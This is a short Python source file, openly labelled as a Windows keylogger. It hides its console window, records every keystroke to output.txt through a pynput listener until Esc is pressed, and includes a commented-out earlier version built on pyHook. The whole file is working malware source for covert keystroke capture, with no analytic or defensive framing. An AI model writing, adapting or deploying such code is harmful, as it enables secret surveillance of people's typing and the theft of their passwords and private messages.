# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

from pynput.keyboard import Key, Listener

with open("output.txt", "a+") as f:
    def on_press(key):
        if(len(str(key))==3):
            f.write(key.char)
        else:
            f.write(str(key))

    def on_release(key):
        if key == Key.esc:
            # Stop listener
            return False

    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

win32gui.ShowWindow(win, 1) 

# def OnKeyboardEvent(event):
#     if event.Ascii==32: 

#         exit() 
#     # if event.Ascii !=0 or 8: 
#     # #open output.txt to read current keystrokes 
#     #     f = open('output.txt', 'r+') 
#     #     buffer = f.read() 
#     #     f.close() 
#     # # open output.txt to write current + new keystrokes 
#     # f = open('output.txt', 'w') 
#     # keylogs = chr(event.Ascii) 
#     # if event.Ascii == 13: 
#     #     keylogs = '/n'
#     #     buffer += keylogs 
#     #     f.write(buffer)
#     #     f.close() 


#     with open("output.txt", "w") as f:
#         keylogs = chr(event.Ascii)
#         f.write(keylogs)

# # create a hook manager object 
# hm = pyHook.HookManager() 
# hm.KeyDown = OnKeyboardEvent 
# # set the hook 
# hm.HookKeyboard() 
# # wait forever 
# pythoncom.PumpMessages() 
